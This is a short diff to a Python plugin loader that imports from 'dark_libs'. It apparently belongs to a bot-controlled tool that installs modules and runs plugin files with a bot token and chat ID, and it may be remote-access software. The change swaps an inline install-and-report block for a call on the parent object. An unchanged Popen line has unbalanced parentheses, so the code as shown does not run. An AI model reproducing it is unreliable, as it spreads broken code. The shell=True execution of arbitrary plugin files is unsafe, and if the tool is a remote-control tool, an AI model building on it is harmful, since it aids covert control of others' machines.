@@ -5,6 +5,7 @@ import tempfile
 from dark_libs.Functions import *
 class Plugin():
 	def __init__(self, _):
+		self._ = _
 		self.plugins = _.plugins
 		self.token = _.token
 		self.plugin = _.args[0]
@@ -39,12 +40,7 @@ class Plugin():
 							elif i.startswith("import "):
 								module = i.replace("import ","").split(".")[0]
 							self.Send_Message.Send("%F0%9F%93%8C Installing (" + module + ")" + " Module...")
-							install = Install_Module(module)
-							if install == True:
-								self.Send_Message.Send("%E2%9C%94%EF%B8%8F Install (" + module + ")" + " Module Seccsed.")
-							else:
-								self.Send_Message.Send("%E2%9C%96%EF%B8%8F Install (" + module + ")" + " Module Failed\n\n%E2%9D%96 Error : " + install)
-
+							self._.Install_Module(module)
 				sub = subprocess.Popen([path.dirname(sys.executable)), filename, self.token, self.chat_id], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 			else:
 				sub = subprocess.Popen([filename, self.token, self.chat_id] ,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
